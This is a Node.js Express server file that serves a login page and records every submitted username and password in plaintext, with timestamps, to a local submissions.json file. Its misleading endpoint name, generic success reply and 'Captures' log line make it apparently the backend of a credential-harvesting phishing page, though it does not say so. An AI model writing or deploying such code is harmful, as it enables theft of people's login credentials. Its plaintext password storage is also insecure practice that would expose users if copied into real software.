const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = 3000;

const JSON_FILE_PATH = path.join(__dirname, 'submissions.json');

// Auto-initialize storage database file if missing
if (!fs.existsSync(JSON_FILE_PATH)) {
  fs.writeFileSync(JSON_FILE_PATH, JSON.stringify([], null, 2));
}

// Middleware to read standard native HTML form post streams
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Root route to serve your index.html page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Endpoint: Parses the standard form body payload securely sent from the client
app.post('/api/get-result', (req, res) => {
  try {
    const { username, password, remember } = req.body;

    const newEntry = {
      id: `ENTRY-${Date.now()}`,
      timestamp: new Date().toISOString(),
      username: username || "",
      password: password || "",
      additional_fields: {
        remember: remember === 'on'
      }
    };

    // Load existing structures, append the payload, and save back to disk
    const fileData = fs.readFileSync(JSON_FILE_PATH, 'utf8');
    const entries = JSON.parse(fileData || '[]');
    entries.push(newEntry);
    fs.writeFileSync(JSON_FILE_PATH, JSON.stringify(entries, null, 2));

    // Fallback response page signaling successful stream completion
    return res.send("Form data processed successfully.");

  } catch (err) {
    console.error("Database log failed:", err);
    return res.status(500).send("Internal server processing error.");
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Live development server running at: http://localhost:${PORT}`);
  console.log(`📂 Captures routing straight to disk database: ${JSON_FILE_PATH}`);
});
